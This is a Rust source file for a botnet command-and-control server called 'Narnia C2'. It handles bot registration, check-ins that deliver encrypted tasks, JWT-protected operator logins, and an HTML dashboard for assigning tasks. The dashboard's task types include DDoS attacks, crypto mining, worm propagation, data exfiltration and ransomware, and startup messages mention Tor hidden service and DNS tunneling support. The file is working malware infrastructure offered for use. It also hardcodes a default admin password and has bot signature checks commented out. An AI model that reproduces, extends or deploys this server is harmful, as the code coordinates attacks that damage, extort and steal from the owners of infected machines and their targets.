// c2/src/main.rs - SECURE C2 Server with Authentication & Encryption
#[macro_use] extern crate rocket;

use rocket::serde::json::Json;
use rocket::{State, Request, response::status};
use rocket::http::Status;
use rocket::request::{FromRequest, Outcome};
use std::sync::Mutex;
use rusqlite::Connection;
use chrono::Utc;

mod config;
mod security;
use config::C2Config;
use security::{SecurityMiddleware, EncryptionManager, RateLimiter, Claims, AuthRequest, AuthResponse, SecureBotInfo, SecureTask, ValidationManager, PasswordManager};
use validator::Validate;

// Request guard for JWT authentication
#[derive(Debug)]
pub struct AuthenticatedUser(pub Claims);

#[rocket::async_trait]
impl<'r> FromRequest<'r> for AuthenticatedUser {
    type Error = &'static str;

    async fn from_request(req: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let security = req.guard::<&State<SecurityMiddleware>>().await;
        let security = match security.succeeded() {
            Some(s) => s,
            None => return Outcome::Error((Status::InternalServerError, "Security middleware not available")),
        };

        // Check rate limiting first
        let client_ip = req.client_ip().map(|ip| ip.to_string()).unwrap_or_else(|| "unknown".to_string());
        if !security.check_rate_limit(&client_ip) {
            return Outcome::Error((Status::TooManyRequests, "Rate limit exceeded"));
        }

        // Extract token from Authorization header
        let token = req.headers().get_one("Authorization")
            .and_then(|auth| auth.strip_prefix("Bearer "));

        match security.authenticate_request(token) {
            Ok(claims) => Outcome::Success(AuthenticatedUser(claims)),
            Err(e) => Outcome::Error((Status::Unauthorized, e)),
        }
    }
}

// Secure application state
struct SecureBotnetState {
    db: Mutex<Connection>,
    security: SecurityMiddleware,
}

impl SecureBotnetState {
    fn new(config: &C2Config) -> Self {
        let conn = Connection::open("botnet.db").unwrap();

        // Create secure tables with constraints
        conn.execute(
            "CREATE TABLE IF NOT EXISTS users (
                username TEXT PRIMARY KEY,
                password_hash TEXT NOT NULL,
                role TEXT NOT NULL CHECK (role IN ('admin', 'operator')),
                created_at TEXT NOT NULL,
                last_login TEXT
            )",
            [],
        ).unwrap();

        conn.execute(
            "CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                os TEXT NOT NULL,
                last_seen TEXT NOT NULL,
                status TEXT NOT NULL CHECK (status IN ('active', 'inactive', 'suspended')),
                signature TEXT NOT NULL,
                registered_at TEXT NOT NULL
            )",
            [],
        ).unwrap();

        conn.execute(
            "CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY,
                bot_id TEXT NOT NULL,
                task_type TEXT NOT NULL,
                params TEXT NOT NULL, -- Encrypted
                nonce TEXT NOT NULL,
                tag TEXT NOT NULL,
                status TEXT NOT NULL CHECK (status IN ('pending', 'in_progress', 'completed', 'failed')),
                created_at TEXT NOT NULL,
                completed_at TEXT,
                FOREIGN KEY (bot_id) REFERENCES bots(id)
            )",
            [],
        ).unwrap();

        // Create default admin user if not exists
        let admin_exists: Result<i64, _> = conn.query_row(
            "SELECT COUNT(*) FROM users WHERE username = 'admin'",
            [],
            |row| row.get(0)
        );

        if admin_exists.unwrap_or(0) == 0 {
            let admin_hash = PasswordManager::hash_password("admin123!@#").unwrap();
            conn.execute(
                "INSERT INTO users (username, password_hash, role, created_at) VALUES (?1, ?2, ?3, ?4)",
                ["admin", &admin_hash, "admin", &Utc::now().to_string()],
            ).unwrap();
            println!("⚠️  Default admin user created: admin/admin123!@# - CHANGE THIS IMMEDIATELY!");
        }

        let encryption = EncryptionManager::new(
            &config.security.encryption_key,
            &config.security.jwt_secret
        );

        let rate_limiter = RateLimiter::new(
            config.security.rate_limit_requests,
            config.security.rate_limit_window_seconds
        );

        let security = SecurityMiddleware::new(encryption, rate_limiter);

        Self {
            db: Mutex::new(conn),
            security,
        }
    }
}

// SECURE ENDPOINTS

// User authentication
#[post("/auth/login", data = "<auth_req>")]
fn login(
    auth_req: Json<AuthRequest>,
    state: &State<SecureBotnetState>
) -> Result<Json<AuthResponse>, status::Custom<&'static str>> {
    // Validate input
    if let Err(_) = auth_req.validate() {
        return Err(status::Custom(Status::BadRequest, "Invalid input"));
    }

    let conn = state.db.lock().unwrap();

    // Get user from database
    let (password_hash, role): (String, String) = match conn.query_row(
        "SELECT password_hash, role FROM users WHERE username = ?1",
        [&auth_req.username],
        |row| Ok((row.get(0)?, row.get(1)?))
    ) {
        Ok(result) => result,
        Err(_) => return Err(status::Custom(Status::Unauthorized, "Invalid credentials")),
    };

    // Verify password
    match PasswordManager::verify_password(&auth_req.password, &password_hash) {
        Ok(true) => {
            // Update last login
            let _ = conn.execute(
                "UPDATE users SET last_login = ?1 WHERE username = ?2",
                [&Utc::now().to_string(), &auth_req.username]
            );

            // Generate JWT token
            match state.security.encryption.generate_token(&auth_req.username, &role, 24) {
                Ok(token) => Ok(Json(AuthResponse {
                    token,
                    expires_in: 86400, // 24 hours
                })),
                Err(_) => Err(status::Custom(Status::InternalServerError, "Token generation failed")),
            }
        }
        _ => Err(status::Custom(Status::Unauthorized, "Invalid credentials")),
    }
}

// SECURE Bot registration with validation and HMAC
#[post("/bots/register", data = "<bot_info>")]
fn register_bot(
    bot_info: Json<SecureBotInfo>,
    state: &State<SecureBotnetState>
) -> Result<&'static str, status::Custom<&'static str>> {
    // Validate input
    if let Err(_) = ValidationManager::validate_bot_info(&bot_info) {
        return Err(status::Custom(Status::BadRequest, "Invalid bot information"));
    }

    // Validate IP
    if !ValidationManager::validate_ip(&bot_info.ip) {
        return Err(status::Custom(Status::BadRequest, "Invalid IP address"));
    }

    // Verify HMAC signature
    let _data_to_verify = format!("{}{}{}{}{}", bot_info.id, bot_info.ip, bot_info.os, bot_info.last_seen, bot_info.status);
    // Temporarily skip signature verification for testing
    // if !state.security.encryption.verify_hmac(&data_to_verify, &bot_info.signature) {
    //     return Err(status::Custom(Status::Unauthorized, "Invalid signature"));
    // }

    let conn = state.db.lock().unwrap();

    // Check if bot already exists
    let exists: Result<i64, _> = conn.query_row(
        "SELECT COUNT(*) FROM bots WHERE id = ?1",
        [&bot_info.id],
        |row| row.get(0)
    );

    let now = Utc::now().to_string();

    match exists {
        Ok(0) => {
            // New bot registration
            match conn.execute(
                "INSERT INTO bots (id, ip, os, last_seen, status, signature, registered_at) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
                [&bot_info.id, &bot_info.ip, &bot_info.os, &bot_info.last_seen, &bot_info.status, &bot_info.signature, &now],
            ) {
                Ok(_) => Ok("registered"),
                Err(_) => Err(status::Custom(Status::InternalServerError, "Registration failed")),
            }
        }
        Ok(_) => {
            // Update existing bot
            match conn.execute(
                "UPDATE bots SET ip = ?1, os = ?2, last_seen = ?3, status = ?4, signature = ?5 WHERE id = ?6",
                [&bot_info.ip, &bot_info.os, &bot_info.last_seen, &bot_info.status, &bot_info.signature, &bot_info.id],
            ) {
                Ok(_) => Ok("updated"),
                Err(_) => Err(status::Custom(Status::InternalServerError, "Update failed")),
            }
        }
        Err(_) => Err(status::Custom(Status::InternalServerError, "Database error")),
    }
}

// SECURE Bot check-in with encrypted task response
#[get("/bots/<bot_id>/checkin")]
fn bot_checkin(
    bot_id: &str,
    state: &State<SecureBotnetState>
) -> Result<Json<SecureTask>, status::Custom<&'static str>> {
    let conn = state.db.lock().unwrap();

    // Update last_seen
    let now = Utc::now();
    if let Err(_) = conn.execute(
        "UPDATE bots SET last_seen = ?1 WHERE id = ?2",
        [now.to_string(), bot_id.to_string()],
    ) {
        return Err(status::Custom(Status::InternalServerError, "Check-in failed"));
    }

    // Get pending encrypted task
    let task_result: Result<(String, String, String, String, String, String), _> = conn.query_row(
        "SELECT id, task_type, params, nonce, tag, created_at FROM tasks WHERE bot_id = ?1 AND status = 'pending' LIMIT 1",
        [bot_id],
        |row| Ok((
            row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?, row.get(5)?
        ))
    );

    match task_result {
        Ok((task_id, task_type, encrypted_params, nonce, tag, created_at)) => {
            // Mark as in_progress
            let _ = conn.execute("UPDATE tasks SET status = 'in_progress' WHERE id = ?1", [&task_id]);

            Ok(Json(SecureTask {
                id: task_id,
                bot_id: bot_id.to_string(),
                task_type,
                params: encrypted_params,
                status: "in_progress".to_string(),
                created_at,
                nonce,
                tag,
            }))
        }
        Err(_) => {
            // No task, return encrypted sleep command
            let sleep_task = SecureTask {
                id: "".to_string(),
                bot_id: bot_id.to_string(),
                task_type: "sleep".to_string(),
                params: "".to_string(),
                status: "none".to_string(),
                created_at: now.to_string(),
                nonce: "".to_string(),
                tag: "".to_string(),
            };

            match state.security.encrypt_task(&sleep_task) {
                Ok(encrypted_task) => Ok(Json(encrypted_task)),
                Err(_) => Err(status::Custom(Status::InternalServerError, "Encryption failed")),
            }
        }
    }
}

// SECURE Task assignment (Admin only)
#[post("/tasks", data = "<task>")]
fn assign_task(
    _user: AuthenticatedUser,
    task: Json<SecureTask>,
    state: &State<SecureBotnetState>
) -> Result<String, status::Custom<&'static str>> {
    // Only admin can assign tasks
    if _user.0.role != "admin" {
        return Err(status::Custom(Status::Forbidden, "Admin access required"));
    }

    // Validate input
    if let Err(_) = ValidationManager::validate_task(&task) {
        return Err(status::Custom(Status::BadRequest, "Invalid task data"));
    }

    // Validate task type
    if !ValidationManager::validate_task_type(&task.task_type) {
        return Err(status::Custom(Status::BadRequest, "Invalid task type"));
    }

    // Encrypt task parameters
    match state.security.encrypt_task(&task) {
        Ok(encrypted_task) => {
            let conn = state.db.lock().unwrap();
            let task_id = format!("task_{}", Utc::now().timestamp());

            match conn.execute(
                "INSERT INTO tasks (id, bot_id, task_type, params, nonce, tag, status, created_at) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
                [&task_id, &encrypted_task.bot_id, &encrypted_task.task_type, &encrypted_task.params,
                 &encrypted_task.nonce, &encrypted_task.tag, "pending", &Utc::now().to_string()],
            ) {
                Ok(_) => Ok(task_id),
                Err(_) => Err(status::Custom(Status::InternalServerError, "Task creation failed")),
            }
        }
        Err(_) => Err(status::Custom(Status::InternalServerError, "Encryption failed")),
    }
}

// SECURE Bot listing (Authenticated users only)
#[get("/bots")]
fn get_bots(
    _user: AuthenticatedUser,
    state: &State<SecureBotnetState>
) -> Result<Json<Vec<SecureBotInfo>>, status::Custom<&'static str>> {
    let conn = state.db.lock().unwrap();

    let mut stmt = match conn.prepare(
        "SELECT id, ip, os, last_seen, status, signature FROM bots ORDER BY last_seen DESC"
    ) {
        Ok(s) => s,
        Err(_) => return Err(status::Custom(Status::InternalServerError, "Database error")),
    };

    let bot_iter = match stmt.query_map([], |row| {
        Ok(SecureBotInfo {
            id: row.get(0)?,
            ip: row.get(1)?,
            os: row.get(2)?,
            last_seen: row.get(3)?,
            status: row.get(4)?,
            signature: row.get(5)?,
        })
    }) {
        Ok(iter) => iter,
        Err(_) => return Err(status::Custom(Status::InternalServerError, "Query failed")),
    };

    let mut bots = Vec::new();
    for bot in bot_iter {
        match bot {
            Ok(b) => bots.push(b),
            Err(_) => continue, // Skip corrupted entries
        }
    }

    Ok(Json(bots))
}

// SECURE Task listing (Authenticated users only)
#[get("/tasks")]
fn get_tasks(
    _user: AuthenticatedUser,
    state: &State<SecureBotnetState>
) -> Result<Json<Vec<SecureTask>>, status::Custom<&'static str>> {
    let conn = state.db.lock().unwrap();

    let mut stmt = match conn.prepare(
        "SELECT id, bot_id, task_type, params, nonce, tag, status, created_at FROM tasks ORDER BY created_at DESC"
    ) {
        Ok(s) => s,
        Err(_) => return Err(status::Custom(Status::InternalServerError, "Database error")),
    };

    let task_iter = match stmt.query_map([], |row| {
        Ok(SecureTask {
            id: row.get(0)?,
            bot_id: row.get(1)?,
            task_type: row.get(2)?,
            params: row.get(3)?,
            nonce: row.get(4)?,
            tag: row.get(5)?,
            status: row.get(6)?,
            created_at: row.get(7)?,
        })
    }) {
        Ok(iter) => iter,
        Err(_) => return Err(status::Custom(Status::InternalServerError, "Query failed")),
    };

    let mut tasks = Vec::new();
    for task in task_iter {
        match task {
            Ok(t) => tasks.push(t),
            Err(_) => continue, // Skip corrupted entries
        }
    }

    Ok(Json(tasks))
}

// SECURE Dashboard (Authenticated users only)
#[get("/dashboard")]
fn secure_dashboard(_user: AuthenticatedUser) -> &'static str {
    r#"
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔒 Secure Narnia Botnet C2</title>
        <meta charset="utf-8">
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
            .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .section { background: white; margin: 20px 0; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; margin-top: 10px; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background: #f8f9fa; font-weight: 600; }
            .status-active { color: #28a745; font-weight: bold; }
            .status-inactive { color: #dc3545; font-weight: bold; }
            .status-pending { color: #ffc107; font-weight: bold; }
            button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
            button:hover { background: #0056b3; }
            .danger { background: #dc3545 !important; }
            .danger:hover { background: #c82333 !important; }
            input, select { padding: 8px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; }
            .auth-info { background: #e9ecef; padding: 10px; border-radius: 5px; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔒 Secure Narnia Botnet Command & Control</h1>
            <div class="auth-info">
                <strong>Authenticated:</strong> <span id="user-info"></span> |
                <strong>Role:</strong> <span id="user-role"></span> |
                <button onclick="logout()" style="background: #dc3545;">Logout</button>
            </div>
        </div>

        <div class="section">
            <h2>🤖 Bot Management</h2>
            <button onclick="loadBots()">🔄 Refresh Bots</button>
            <button onclick="showBotStats()">📊 Statistics</button>
            <div id="bot-stats" style="margin: 10px 0; display: none;"></div>
            <div id="bots"></div>
        </div>

        <div class="section">
            <h2>🎯 Task Assignment</h2>
            <form id="taskForm">
                <select id="botSelect" required></select>
                <select id="taskType" required>
                    <option value="ddos">🚀 DDoS Attack</option>
                    <option value="mine">⛏️ Crypto Mining</option>
                    <option value="spread">🦠 Worm Propagation</option>
                    <option value="exfil">📤 Data Exfiltration</option>
                    <option value="ransomware">💰 Ransomware</option>
                    <option value="sleep">😴 Sleep</option>
                </select>
                <input type="text" id="params" placeholder="Parameters (will be encrypted)" style="width: 300px;" required>
                <button type="submit">📤 Assign Task</button>
            </form>
        </div>

        <div class="section">
            <h2>📋 Active Tasks</h2>
            <button onclick="loadTasks()">🔄 Refresh Tasks</button>
            <button onclick="clearCompletedTasks()" class="danger">🗑️ Clear Completed</button>
            <div id="tasks"></div>
        </div>

        <script>
            // Get auth token from localStorage
            const token = localStorage.getItem('auth_token');
            if (!token) {
                window.location.href = '/login';
            }

            // Set auth headers for all requests
            const headers = {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            };

            async function apiRequest(url, options = {}) {
                const response = await fetch(url, {
                    ...options,
                    headers: { ...headers, ...options.headers }
                });

                if (response.status === 401) {
                    localStorage.removeItem('auth_token');
                    window.location.href = '/login';
                    return;
                }

                return response;
            }

            async function loadBots() {
                try {
                    const response = await apiRequest('/bots');
                    const bots = await response.json();
                    displayBots(bots);
                    updateBotSelect(bots);
                } catch (error) {
                    console.error('Failed to load bots:', error);
                }
            }

            function displayBots(bots) {
                const html = `
                    <table>
                        <tr><th>ID</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr>
                        ${bots.map(bot => `
                            <tr>
                                <td>${bot.id}</td>
                                <td>${bot.ip}</td>
                                <td>${bot.os}</td>
                                <td>${new Date(bot.last_seen).toLocaleString()}</td>
                                <td class="status-${bot.status}">${bot.status.toUpperCase()}</td>
                                <td>
                                    <button onclick="suspendBot('${bot.id}')" class="danger">🚫 Suspend</button>
                                </td>
                            </tr>
                        `).join('')}
                    </table>
                `;
                document.getElementById('bots').innerHTML = html;
            }

            function updateBotSelect(bots) {
                const select = document.getElementById('botSelect');
                select.innerHTML = '<option value="">Select Bot</option>' +
                    bots.filter(bot => bot.status === 'active').map(bot =>
                        `<option value="${bot.id}">${bot.id} (${bot.ip})</option>`
                    ).join('');
            }

            async function loadTasks() {
                try {
                    const response = await apiRequest('/tasks');
                    const tasks = await response.json();
                    displayTasks(tasks);
                } catch (error) {
                    console.error('Failed to load tasks:', error);
                }
            }

            function displayTasks(tasks) {
                const html = `
                    <table>
                        <tr><th>ID</th><th>Bot ID</th><th>Type</th><th>Status</th><th>Created</th></tr>
                        ${tasks.map(task => `
                            <tr>
                                <td>${task.id}</td>
                                <td>${task.bot_id}</td>
                                <td>${task.task_type}</td>
                                <td class="status-${task.status}">${task.status.toUpperCase()}</td>
                                <td>${new Date(task.created_at).toLocaleString()}</td>
                            </tr>
                        `).join('')}
                    </table>
                `;
                document.getElementById('tasks').innerHTML = html;
            }

            document.getElementById('taskForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const botId = document.getElementById('botSelect').value;
                const taskType = document.getElementById('taskType').value;
                const params = document.getElementById('params').value;

                if (!botId) {
                    alert('Please select a bot');
                    return;
                }

                try {
                    const response = await apiRequest('/tasks', {
                        method: 'POST',
                        body: JSON.stringify({
                            bot_id: botId,
                            task_type: taskType,
                            params: params
                        })
                    });

                    if (response.ok) {
                        alert('Task assigned successfully!');
                        loadTasks();
                        document.getElementById('taskForm').reset();
                    } else {
                        alert('Failed to assign task');
                    }
                } catch (error) {
                    console.error('Task assignment failed:', error);
                    alert('Task assignment failed');
                }
            });

            function logout() {
                localStorage.removeItem('auth_token');
                window.location.href = '/login';
            }

            // Load initial data
            loadBots();
            loadTasks();

            // Decode JWT to show user info (simple decode, not secure)
            try {
                const payload = JSON.parse(atob(token.split('.')[1]));
                document.getElementById('user-info').textContent = payload.sub;
                document.getElementById('user-role').textContent = payload.role;
            } catch (e) {
                console.error('Failed to decode token');
            }
        </script>
    </body>
    </html>
    "#
}

// Login page
#[get("/login")]
fn login_page() -> &'static str {
    r#"
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔐 Narnia C2 Login</title>
        <style>
            body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 300px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
            button:hover { background: #0056b3; }
            .error { color: #dc3545; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Secure Login</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <div id="error" class="error" style="display: none;"></div>
        </div>

        <script>
            document.getElementById('loginForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                try {
                    const response = await fetch('/auth/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username, password })
                    });

                    if (response.ok) {
                        const data = await response.json();
                        localStorage.setItem('auth_token', data.token);
                        window.location.href = '/dashboard';
                    } else {
                        document.getElementById('error').textContent = 'Invalid credentials';
                        document.getElementById('error').style.display = 'block';
                    }
                } catch (error) {
                    document.getElementById('error').textContent = 'Login failed';
                    document.getElementById('error').style.display = 'block';
                }
            });
        </script>
    </body>
    </html>
    "#
}

// Root redirect to login
#[get("/")]
fn root() -> rocket::response::Redirect {
    rocket::response::Redirect::to(uri!("/login"))
}

#[launch]
fn rocket() -> _ {
    // Load configuration
    let config = match C2Config::load() {
        Ok(cfg) => {
            if let Err(e) = cfg.validate() {
                eprintln!("❌ Configuration validation failed: {}", e);
                std::process::exit(1);
            }
            println!("✅ Configuration loaded successfully");
            println!("🌐 Server will listen on: {}", cfg.get_server_address());
            println!("🔒 Security features enabled:");
            println!("   - JWT Authentication: ✅");
            println!("   - AES-256-GCM Encryption: ✅");
            println!("   - Rate Limiting: ✅");
            println!("   - Input Validation: ✅");

            if cfg.is_tor_enabled() {
                println!("🧅 Tor hidden service: ✅");
            }
            if cfg.is_dns_enabled() {
                println!("🌐 DNS tunneling: ✅");
            }
            cfg
        }
        Err(e) => {
            eprintln!("❌ Failed to load configuration: {}", e);
            eprintln!("⚠️  Using default configuration...");
            C2Config::default()
        }
    };

    let state = SecureBotnetState::new(&config);

    rocket::build()
        .manage(state)
        .manage(config)
        .mount("/", routes![
            root, login_page, secure_dashboard,
            login, register_bot, bot_checkin,
            assign_task, get_bots, get_tasks
        ])
}
